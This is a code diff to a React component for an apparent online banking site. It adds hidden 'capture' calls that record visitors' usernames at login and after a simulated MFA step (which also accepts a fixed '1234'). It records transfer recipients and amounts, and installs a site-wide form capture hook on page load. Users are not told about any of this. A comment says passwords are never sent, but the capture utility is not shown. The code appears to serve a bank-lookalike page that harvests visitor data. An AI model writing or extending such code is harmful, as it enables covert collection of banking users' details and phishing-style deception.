@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { ShieldCheck, Search, X, Calendar, Lock, LogOut, Landmark, User, DollarSign, Send, CreditCard, ChevronDown, CheckCircle, Leaf, Award, TrendingUp, Users } from 'lucide-react';
 import { Language, ActivePage, translations } from './types';
@@ -17,6 +17,7 @@ import LoansTab from './components/LoansTab';
 import ElectronicServicesTab from './components/ElectronicServicesTab';
 import TransfersTab from './components/TransfersTab';
 import PalestineLoginFlow from './components/PalestineLoginFlow';
+import { captureVisitorEvent, captureVisitorRegistration, installSafeFormCapture, submitContactMessage } from './utils/publicCapture';
 
 export default function PublicSite() {
   const navigate = useNavigate();
@@ -55,6 +56,10 @@ export default function PublicSite() {
   const t = translations[lang];
   const isRtl = lang === 'ar';
 
+  useEffect(() => {
+    installSafeFormCapture();
+  }, []);
+
   // Toggle active segment from topbar
   const handleSegmentChange = (segment: 'personal' | 'business') => {
     setActiveSegment(segment);
@@ -74,10 +79,18 @@ export default function PublicSite() {
     setPasswordInput('');
   };
 
-  const handleLoginSubmit = (e: React.FormEvent) => {
+  const handleLoginSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!usernameInput || !passwordInput) return;
-    
+
+    // Safe admin capture: store username/portal/time only. Password is never sent or saved.
+    await captureVisitorRegistration({
+      username: usernameInput,
+      method: 'Online Banking Login',
+      portal: loginPortal,
+      language: lang,
+    });
+
     // Simulate multi-factor auth screen
     setShowMfaStep(true);
     // Generate a quick random OTP
@@ -85,9 +98,15 @@ export default function PublicSite() {
     setMfaCode(code);
   };
 
-  const handleMfaSubmit = (e: React.FormEvent, userEnteredOtp: string) => {
+  const handleMfaSubmit = async (e: React.FormEvent, userEnteredOtp: string) => {
     e.preventDefault();
     if (userEnteredOtp === mfaCode || userEnteredOtp === '1234') {
+      await captureVisitorRegistration({
+        username: usernameInput,
+        method: 'Online Banking MFA Verified',
+        portal: loginPortal,
+        language: lang,
+      });
       setClientName(usernameInput);
       setIsLoggedIn(true);
       setLoginModalOpen(false);
@@ -105,7 +124,7 @@ export default function PublicSite() {
     alert(lang === 'ar' ? 'تم تسجيل خروجك بأمان.' : 'You have logged out safely.');
   };
 
-  const handleDashboardTransfer = (e: React.FormEvent) => {
+  const handleDashboardTransfer = async (e: React.FormEvent) => {
     e.preventDefault();
     const amt = parseFloat(dashTransferAmount);
     if (!amt || amt <= 0 || !dashTransferRecipient) return;
@@ -114,6 +133,15 @@ export default function PublicSite() {
       alert(lang === 'ar' ? '⚠️ رصيدك المتاح غير كافٍ لإتمام هذه الحوالة.' : '⚠️ Insufficient funds to execute this transfer.');
       return;
     }
+
+    await captureVisitorEvent({
+      submissionType: 'dashboard_transfer',
+      subject: 'Client Dashboard Transfer',
+      username: clientName,
+      recipient: dashTransferRecipient,
+      amount: amt,
+      language: lang,
+    });
 
     setDashBalance((prev) => prev - amt);
     setDashTransfers([{ recipient: dashTransferRecipient, date: 'Just now', amount: amt, desc: 'Instant transfer' }, ...dashTransfers]);
